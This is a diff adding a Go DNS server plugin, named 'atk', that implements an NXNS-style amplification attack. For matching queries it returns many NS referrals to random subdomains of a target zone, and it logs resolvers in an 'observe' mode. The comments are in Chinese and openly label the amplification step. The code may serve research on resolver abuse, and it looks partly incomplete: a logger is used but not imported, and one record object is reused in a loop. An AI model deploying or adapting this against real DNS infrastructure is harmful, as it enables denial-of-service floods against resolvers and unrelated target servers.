@@ -1,0 +1,79 @@
+package atk
+
+import (
+	"context"
+	"github.com/miekg/dns"
+	"github.com/pochard/commons/randstr"
+	"net"
+	"ohmydns2/plugin/pkg/request"
+	"strings"
+)
+
+type Atk struct {
+	magni   int
+	zoneip4 string
+	zoneip6 string
+	ip6NS   string
+	ip4NS   string
+	ip6Addr string
+	ip4Addr string
+}
+
+func (a Atk) ServeDNS(ctx context.Context, w dns.ResponseWriter, r *dns.Msg) (int, error) {
+	state := request.Request{W: w, Req: r}
+
+	msg := new(dns.Msg)
+	msg.SetReply(r)
+	msg.Authoritative = true
+	// 请求的源地址
+	switch a.validRequest(state.QName()) {
+	case 0:
+		//	放大
+		msg = a.Response(msg, 0)
+
+	case 2:
+		//观察
+		log.Infof("接收到请求: %v ask %v", state.IP(), state.Name())
+		msg = a.Response(msg, 1)
+	case 1:
+		//其他请求不响应
+		return 0, nil
+	}
+
+	err := w.WriteMsg(msg)
+	if err != nil {
+		log.Info(err.Error())
+		return dns.RcodeServerFailure, err
+	}
+	return 0, nil
+}
+
+func (a Atk) Name() string {
+	return "atk"
+}
+
+func (a Atk) Response(msg *dns.Msg, iptype int) *dns.Msg {
+	if iptype == 0 { // 放大
+		rec := new(dns.NS)
+		rec.Hdr = dns.RR_Header{Class: dns.ClassINET, Ttl: 10, Rrtype: dns.TypeNS}
+		rec.Hdr.Name = msg.Question[0].Name
+		for i := 0; i < a.magni; i++ {
+			rec.Ns = strings.ToLower(randstr.RandomAlphanumeric(10)) + a.zoneip6
+			msg.Ns = append(msg.Ns, rec)
+		}
+	} else {
+		//返回NXNS
+		msg.Rcode = dns.RcodeNameError
+		//授权记录
+		rec := new(dns.NS)
+		rec.Hdr = dns.RR_Header{Name: a.zoneip6, Class: dns.ClassINET, Ttl: 10, Rrtype: dns.TypeNS}
+		rec.Ns = a.ip6NS
+		msg.Ns = append(msg.Ns, rec)
+		//胶水记录
+		recaddr := new(dns.AAAA)
+		recaddr.Hdr = dns.RR_Header{Name: a.ip6NS, Class: dns.ClassINET, Ttl: 10, Rrtype: dns.TypeAAAA}
+		recaddr.AAAA = net.ParseIP(a.ip6Addr)
+		msg.Extra = append(msg.Extra, recaddr)
+	}
+	return msg
+}
